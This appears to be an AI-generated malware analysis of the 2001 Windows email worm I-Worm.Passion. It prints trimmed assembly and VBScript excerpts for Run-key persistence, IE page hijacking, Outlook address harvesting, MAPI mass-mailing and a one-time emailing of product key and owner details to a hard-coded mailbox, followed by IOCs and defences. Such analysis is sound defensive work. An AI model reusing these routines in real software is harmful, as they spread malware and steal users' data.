# Dissecting I‑Worm.Passion (2001): Outlook harvesting, IE tweaks, and one‑time exfil 🛠️🔍

> "This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes."

## Introduction

I‑Worm.Passion is a small Windows email worm from early September 2001, written in 32‑bit x86 assembly. It installs into the System directory, persists via an HKLM Run value, opportunistically tweaks the user’s Internet Explorer pages based on a simple time‑based heuristic, and propagates using a two‑stage Outlook workflow: a VBScript harvester collects address entries into a text file, then the native code mails each address via Simple MAPI with an executable attachment. A notable behavior is a first‑run data exfiltration path: basic system details are written to a local file and also sent via email to a hard‑coded mailbox when a sentinel registry key is created.

## Overview 🔍

- Platform: Designed for Win9x/ME/2000 era; uses SHLWAPI `SHSetValueA`, WININET `InternetGetConnectedState`, and Simple MAPI.
- Install & persist:
  - Copies itself to `%System%\MsVbdll32.exe`.
  - Creates `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MsVbdll = %System%\MsVbdll32.exe`.
- Connectivity & timing:
  - Waits for network connectivity; uses `GetTickCount % 10 == 2` to occasionally trigger an IE homepage/search/local page change to a fixed URL.
- One‑time info collection/exfil:
  - Creates `HKCU\Software\[Check Passion]` on first run; if newly created, gathers OS user/organization/product key and locale info into `%WinDir%\Passion.txt` and emails that file to a mailbox.
- Propagation:
  - Drops `C:\passion.vbs` to harvest Outlook addresses into `%WinDir%\AllMail.txt` ending with `#`.
  - Parses `AllMail.txt` and sends messages via `MAPISendMail` with subject “Take a look at this...” and attachment display name `Important.exe` (the worm image).

Key APIs: `SHSetValueA`, `SHGetValueA`, `RegCreateKeyExA`, `InternetGetConnectedState`, `GetDateFormatA`, `GetTimeFormatA`, `MAPISendMail`. Macros `@pushsz`, `@endsz`, and `callx` come from `useful.inc`/`myinclude.inc` to streamline calling/inline data.

## Section 2 – Source Code Analysis 🧩

Short, real excerpts from `Passion.asm` below. They’re inert, trimmed, and commented for clarity.

### 2.1 Copy and persist (MsVbdll32.exe + HKLM Run)

```asm
; %System%\MsVbdll32.exe + Run key "MsVbdll"
mov   esi, offset orig_worm
callx GetModuleFileNameA
mov   edi, offset copy_worm
callx GetSystemDirectoryA         ; %System%
add   edi, eax
; build "\\MsVbdll32.exe" via stosd tokens (omitted)
push  0
push  edi
push  esi
callx CopyFileA
push  8
push  edi
push  1
@pushsz "MsVbdll"
@pushsz "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
push  80000002h                   ; HKLM
callx SHSetValueA
```

Impact: Establishes persistence with a conventional HKLM Run value pointing to the System copy.

### 2.2 Connectivity gate and tick‑based trigger

```asm
; Wait for network; occasionally change IE pages
push  0
push  offset connected
callx InternetGetConnectedState
dec   eax
jnz   exec_other                 ; spawn copy and exit if offline
callx GetTickCount
xor   edx, edx
mov   ecx, 10
div   ecx                        ; EDX = tick % 10
cmp   edx, 2
jne   check_connect
call  change_page                ; set IE pages
```

Impact: Spreads preferentially when online; the tick‑mod check pseudo‑randomly triggers the IE page change.

### 2.3 First‑run registry sentinel and info exfil

```asm
; Create HKCU\Software\[Check Passion]; if newly created (disp=1), collect and mail info
push  offset regDisp
push  offset regResu
push  0
push  0F003Fh
push  0
push  0
push  0
@pushsz "Software\\[Check Passion]"
push  80000001h                   ; HKCU
callx RegCreateKeyExA
push  [regResu]
callx RegCloseKey
cmp   [regDisp], 1                ; REG_CREATED_NEW_KEY
jne   vbs_file                    ; skip exfil if key already exists
; ... build %WinDir%\Passion.txt and SHGetValueA RegisteredOwner/Organization/ProductKey ...
; ... WritePrivateProfileStringA entries and MAPISendMail Message2 to passionworm@multimania.com ...
```

Impact: One‑time exfil path on a fresh profile. Artifacts remain in `%WinDir%\Passion.txt`.

### 2.4 IE page modifications (inline string table)

```asm
; Change Default_Page_URL, Search/Start/Local Page under HKCU
call  @value
 db "Default_Page_URL",0
 db "Search Page",0
 db "Start Page",0
 db "Local Page",0
@value: pop  esi
mov  ecx, 4
p_loop:
 push  ecx
 push  32
 @pushsz "http://www.scody.net/ggdag/fra/testi/la_passion_orig.htm"
 push  1
 push  esi
 @pushsz "Software\\Microsoft\\Internet Explorer\\Main"
 push  80000001h
 callx SHSetValueA
 @endsz                         ; step to next key name
 pop   ecx
 loop  p_loop
```

Impact: Compact call/pop table iterates target value names and sets all to the same URL under HKCU.

### 2.5 VBScript harvester and native send loop

```vbs
' C:\passion.vbs — harvest Outlook addresses to %WinDir%\AllMail.txt
On Error Resume Next
Set rush = CreateObject("Outlook.Application")
Set chan = rush.GetNameSpace("MAPI")
Set fso  = CreateObject("Scripting.FileSystemObject")
Set txt  = fso.CreateTextFile(fso.GetSpecialFolder(0) & "\\AllMail.txt")
txt.Close
' ... append P.Address for each entry ...
Set txt = fso.OpenTextFile(fso.GetSpecialFolder(0) & "\\AllMail.txt", 8, True)
txt.WriteLine "#"   ' sentinel
```

```asm
; Parse AllMail.txt until '#' and send via Simple MAPI
mov   edi, offset mail_addr
push  edi
p_c: lodsb
cmp   al, '#'
je    f_mail
cmp   al, 0Dh
je    entr1
stosb
jmp   p_c
entr1:
xor   al, al
stosb
pop   edi
call  send_mail                 ; MAPISendMail(&Message)
```

Impact: Harvest file is authoritative for recipients; each line yields one mail with subject “Take a look at this...” and attachment display name `Important.exe`.

## Artifacts and IOCs

Files:
- `%System%\MsVbdll32.exe` (installed copy)
- `%WinDir%\AllMail.txt` (harvested emails; ends with `#`)
- `C:\passion.vbs` (temporary harvester)
- `%WinDir%\Passion.txt` (collected system info; also used as an attachment for the one‑time exfil email)

Registry:
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MsVbdll = %System%\MsVbdll32.exe`
- `HKCU\Software\[Check Passion]` (presence indicates the exfil path has executed at least once)
- IE values under HKCU set to the fixed URL: `Default_Page_URL`, `Search Page`, `Start Page`, `Local Page`

Email traits:
- Mass‑mail subject: “Take a look at this...”; body: “It's very important. Mail me if you have some problems.”; attachment label: `Important.exe` (actual file = worm image).
- One‑time exfil: message to `passionworm@multimania.com` with `%WinDir%\Passion.txt` attached.

User‑visible:
- No pranks; changes are silent except browser start/search page shifts if triggered.

## Macro and engineering notes

- `@pushsz` simplifies stdcall argument strings inline; `@endsz` walks embedded 0‑terminated tables.
- Using SHLWAPI `SHSetValueA`/`SHGetValueA` yields shorter registry code than Advapi32 APIs.
- The first‑run sentinel logic uses `RegCreateKeyExA` disposition (1 = created, 2 = opened) to gate exfil.

## Mitigation and Defense Strategies 🛡️

### Detection (Analyst focus)
- Registry IOCs: the HKLM Run value `MsVbdll`; the HKCU key `Software\[Check Passion]` (first‑run marker); HKCU IE page values set to the fixed URL.
- File IOCs: `%WinDir%\AllMail.txt` with a trailing `#`; `%WinDir%\Passion.txt`; temporary `C:\passion.vbs`.
- API patterns: `InternetGetConnectedState` gating; `MAPISendMail` mail burst; SHLWAPI registry writes; GetDate/TimeFormat used for timestamped file content.
- Email content: subject/body and `Important.exe` attachment label.

### Prevention (Admin focus)
- Restrict Windows Script Host (WSH) and Outlook COM automation; apply modern OOM guard policies.
- Application allow‑listing: block executions from `%WinDir%` and `%System%` unless signed/approved.
- Email gateway: block executable attachments; pattern‑match the subject/body used by this sample.
- Browser/IE hygiene (legacy): enforce managed start/search pages; prevent user‑mode changes by untrusted processes.
- Least privilege: require admin rights for System directory writes and HKLM Run modifications on NT‑based systems.

## Conclusion

Passion’s behavior aligns with the era’s Outlook‑dependent mailers: a persistence drop, a simple connectivity/timing gate, optional one‑time info exfiltration, and a VBScript‑assisted address harvest that feeds a Simple MAPI sender. Its artifacts (HKLM Run `MsVbdll`, `%WinDir%\AllMail.txt`, `%WinDir%\Passion.txt`) and registry changes provide straightforward detection points, while standard hardening—blocking WSH/OOM, controlling autoruns, and filtering executable attachments—effectively neutralizes its spread on legacy environments.

_Analysis by Copilot — generated via the analyze‑malware Copilot mode._
